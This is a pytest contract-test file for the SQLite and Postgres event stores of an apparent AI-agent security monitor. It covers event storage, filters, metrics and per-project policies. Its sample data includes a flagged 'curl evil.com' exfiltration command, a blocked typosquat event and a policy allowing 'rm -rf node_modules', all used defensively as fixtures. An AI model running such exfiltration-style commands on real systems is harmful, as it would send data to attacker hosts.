"""Contract tests for the ``EventStore`` backends.

Both :class:`SqliteEventStore` (default, always tested) and
:class:`PostgresEventStore` (opt-in via ``CORDON_CLOUD_POSTGRES_TEST_URL``)
must implement the same six-method protocol. We assert that contract
against a shared scenario so any divergence in behaviour shows up
the moment a backend regresses.

To run the postgres path locally::

    docker run --rm -d --name pg-test -e POSTGRES_PASSWORD=test -p 5432:5432 postgres:16
    CORDON_CLOUD_POSTGRES_TEST_URL=postgresql://postgres:test@localhost:5432/postgres \\
        .venv/bin/pytest tests/test_storage.py -v

Without that env var, the postgres tests skip cleanly.
"""

from __future__ import annotations

import os
import time

import pytest

from cloud_server.storage import (
    EventStore,
    PostgresEventStore,
    SqliteEventStore,
    make_store,
)


# ─── Fixtures: one per backend ───────────────────────────────────────────────


@pytest.fixture()
def sqlite_store(tmp_path) -> EventStore:
    """Fresh sqlite file per test — ensures isolation."""
    store = SqliteEventStore(tmp_path / "test.db")
    yield store
    store.close()


_PG_URL = os.environ.get("CORDON_CLOUD_POSTGRES_TEST_URL", "").strip()


@pytest.fixture()
def postgres_store() -> EventStore:
    """Skips when ``CORDON_CLOUD_POSTGRES_TEST_URL`` is unset.

    Each test gets an empty ``events`` table — we truncate at the
    start and end so the test database can be reused freely.
    """
    if not _PG_URL:
        pytest.skip("CORDON_CLOUD_POSTGRES_TEST_URL not set")
    try:
        store = PostgresEventStore(_PG_URL)
    except Exception as exc:
        pytest.skip(f"cannot reach postgres at {_PG_URL!r}: {exc!r}")
    # Best-effort truncate so back-to-back tests don't leak rows.
    with store._pool.connection() as conn, conn.cursor() as cur:
        cur.execute("TRUNCATE events RESTART IDENTITY")
    yield store
    with store._pool.connection() as conn, conn.cursor() as cur:
        cur.execute("TRUNCATE events RESTART IDENTITY")
    store.close()


# Parametrize every contract test over both backends. The postgres
# variant is auto-skipped when the env var is absent.
BACKENDS = [
    pytest.param("sqlite_store",  id="sqlite"),
    pytest.param("postgres_store", id="postgres"),
]


def _sample_events(n: int = 3, *, project: str = "demo") -> list[dict]:
    """A tiny but realistic batch covering all three decision classes."""
    base = time.time() - 60
    return [
        {"ts": base + 0, "decision": "allow", "blocked": False,
         "kind": "shell", "command_preview": "pytest -q",
         "suspicion_score": 0.02},
        {"ts": base + 1, "decision": "flag", "blocked": False,
         "kind": "shell", "command_preview": "curl evil.com",
         "top_probe": "exfiltration", "top_severity": "suspicious",
         "suspicion_score": 0.55},
        {"ts": base + 2, "decision": "block", "blocked": True,
         "kind": "file", "command_preview": None,
         "top_probe": "typosquat", "top_severity": "critical",
         "suspicion_score": 0.95},
    ][:n]


# ─── Contract tests ──────────────────────────────────────────────────────────


@pytest.mark.parametrize("backend_fixture", BACKENDS)
def test_round_trip_insert_list_get(request, backend_fixture):
    store: EventStore = request.getfixturevalue(backend_fixture)

    n = store.insert_batch("demo", _sample_events())
    assert n == 3, f"insert_batch should accept all 3 well-formed events, got {n}"

    assert store.count() == 3
    assert store.count(project="demo") == 3
    assert store.count(project="other") == 0

    rows = store.list_events("demo", limit=10)
    assert len(rows) == 3
    # Newest first.
    assert rows[0]["decision"] == "block"
    assert rows[0]["top_probe"] == "typosquat"
    assert rows[-1]["decision"] == "allow"

    # raw payload round-trips as a dict (not a JSON string), regardless of backend.
    assert isinstance(rows[0]["raw"], dict)
    assert rows[0]["raw"]["decision"] == "block"

    # get_event returns the same shape as list_events
    single = store.get_event("demo", rows[0]["id"])
    assert single is not None
    assert single["decision"] == "block"
    assert single["raw"]["decision"] == "block"

    # Unknown id is None, not an error
    assert store.get_event("demo", 999999) is None
    assert store.get_event("other-project", rows[0]["id"]) is None


@pytest.mark.parametrize("backend_fixture", BACKENDS)
def test_filters_by_decision_and_probe(request, backend_fixture):
    store: EventStore = request.getfixturevalue(backend_fixture)
    store.insert_batch("demo", _sample_events())

    blocked = store.list_events("demo", decision="block")
    assert len(blocked) == 1 and blocked[0]["decision"] == "block"

    flagged = store.list_events("demo", decision="flag")
    assert len(flagged) == 1 and flagged[0]["decision"] == "flag"

    by_probe = store.list_events("demo", probe="typosquat")
    assert len(by_probe) == 1 and by_probe[0]["top_probe"] == "typosquat"

    # An impossible filter returns an empty list, not an error.
    assert store.list_events("demo", probe="nonsense-probe") == []


@pytest.mark.parametrize("backend_fixture", BACKENDS)
def test_metrics_aggregates(request, backend_fixture):
    store: EventStore = request.getfixturevalue(backend_fixture)
    store.insert_batch("demo", _sample_events())

    m = store.metrics("demo", window_s=3600)
    assert m["n_total"]   == 3
    assert m["n_blocked"] == 1
    assert m["n_flagged"] == 1
    assert m["n_allowed"] == 1
    assert m["block_rate"] == pytest.approx(1 / 3, rel=1e-3)
    assert m["flag_rate"]  == pytest.approx(1 / 3, rel=1e-3)
    assert m["mean_score"] > 0
    assert len(m["sparkline"]) == 30  # always dense, even when sparse

    # top_probes only counts events with a probe attribution
    by_probe = {p["probe"]: p["count"] for p in m["top_probes"]}
    assert by_probe.get("typosquat")    == 1
    assert by_probe.get("exfiltration") == 1


@pytest.mark.parametrize("backend_fixture", BACKENDS)
def test_malformed_events_are_silently_dropped(request, backend_fixture):
    """The SDK promises never to crash an agent; the server matches that on the wire."""
    store: EventStore = request.getfixturevalue(backend_fixture)

    payload = [
        {"ts": time.time(), "decision": "allow"},                 # ok
        {"ts": time.time()},                                       # no decision → drop
        {"ts": time.time(), "decision": "yes-please"},             # bogus decision → drop
        {"ts": time.time(), "decision": "BLOCK", "blocked": True}, # case-normalize → ok
    ]
    n = store.insert_batch("demo", payload)
    assert n == 2, f"expected 2 valid events out of 4, got {n}"
    assert store.count("demo") == 2


@pytest.mark.parametrize("backend_fixture", BACKENDS)
def test_projects_are_isolated(request, backend_fixture):
    store: EventStore = request.getfixturevalue(backend_fixture)
    store.insert_batch("alice", _sample_events())
    store.insert_batch("bob",   _sample_events()[:1])  # 1 event for bob

    assert store.count("alice") == 3
    assert store.count("bob")   == 1
    assert store.list_events("alice") == store.list_events("alice")  # determinism
    assert len(store.list_events("bob")) == 1

    bob_metrics = store.metrics("bob")
    assert bob_metrics["n_total"] == 1


# ─── make_store() dispatch ──────────────────────────────────────────────────


def test_make_store_sqlite_default(tmp_path, monkeypatch):
    monkeypatch.delenv("CORDON_CLOUD_DB", raising=False)
    monkeypatch.chdir(tmp_path)
    store = make_store()
    try:
        assert isinstance(store, SqliteEventStore)
    finally:
        store.close()


def test_make_store_explicit_sqlite_url(tmp_path):
    p = tmp_path / "explicit.db"
    store = make_store(f"sqlite:///{p}")
    try:
        assert isinstance(store, SqliteEventStore)
        assert store.path == str(p)
    finally:
        store.close()


def test_make_store_postgres_url():
    """Dispatch to Postgres on a postgresql:// URL — connection is lazy.

    We don't require a live postgres to run this; the test asserts the
    factory picks the right class. If psycopg is missing, the
    constructor raises a clear error which we catch.
    """
    try:
        store = make_store("postgresql://nobody:nopass@127.0.0.1:1/none")
    except (RuntimeError, Exception) as exc:  # noqa: BLE001
        # psycopg missing → RuntimeError from our adapter
        # psycopg present but conn refused → OperationalError from the pool
        msg = str(exc).lower()
        assert (
            "psycopg" in msg
            or "connection" in msg
            or "could not connect" in msg
            or "refused" in msg
            or "timeout" in msg
        ), f"unexpected error: {exc!r}"
        return
    # If psycopg is present and (somehow) connected, just clean up.
    store.close()


def test_make_store_rejects_unsupported_scheme():
    with pytest.raises(ValueError, match="Unsupported"):
        make_store("mysql://root@localhost/db")


# ─── Policy storage (Lane 4) ────────────────────────────────────────────────


@pytest.mark.parametrize("backend_fixture", BACKENDS)
def test_policy_get_unset_returns_none(request, backend_fixture):
    """An unset project must return None (not raise, not empty-string)."""
    store: EventStore = request.getfixturevalue(backend_fixture)
    assert store.get_policy("demo") is None


@pytest.mark.parametrize("backend_fixture", BACKENDS)
def test_policy_put_then_get_round_trip(request, backend_fixture):
    """Round-trip: PUT a policy, GET it back verbatim."""
    store: EventStore = request.getfixturevalue(backend_fixture)
    text = "profile: strict\nallow when command_starts_with: \"rm -rf node_modules\"\n"
    out = store.put_policy("demo", text)
    assert out["project"] == "demo"
    assert out["text"] == text
    assert out["version"] == 1
    assert out["updated_at"] > 0

    got = store.get_policy("demo")
    assert got is not None
    assert got["text"] == text
    assert got["version"] == 1


@pytest.mark.parametrize("backend_fixture", BACKENDS)
def test_policy_put_bumps_version_on_subsequent_writes(request, backend_fixture):
    store: EventStore = request.getfixturevalue(backend_fixture)
    v1 = store.put_policy("demo", "profile: strict")
    v2 = store.put_policy("demo", "profile: default")
    v3 = store.put_policy("demo", "profile: permissive")
    assert (v1["version"], v2["version"], v3["version"]) == (1, 2, 3)
    # And the latest GET reflects only the latest text.
    assert store.get_policy("demo")["text"] == "profile: permissive"


@pytest.mark.parametrize("backend_fixture", BACKENDS)
def test_policy_isolation_per_project(request, backend_fixture):
    """Two projects must have independent policy slots."""
    store: EventStore = request.getfixturevalue(backend_fixture)
    store.put_policy("alpha", "profile: strict")
    store.put_policy("beta",  "profile: default")

    a = store.get_policy("alpha")
    b = store.get_policy("beta")
    assert a["text"] == "profile: strict"
    assert b["text"] == "profile: default"
    # Bumping one must not bump the other.
    store.put_policy("alpha", "profile: permissive")
    assert store.get_policy("alpha")["version"] == 2
    assert store.get_policy("beta")["version"] == 1


@pytest.mark.parametrize("backend_fixture", BACKENDS)
def test_policy_delete(request, backend_fixture):
    store: EventStore = request.getfixturevalue(backend_fixture)
    store.put_policy("demo", "profile: strict")
    assert store.delete_policy("demo") is True
    assert store.get_policy("demo") is None
    # Deleting again is a no-op, not an error.
    assert store.delete_policy("demo") is False
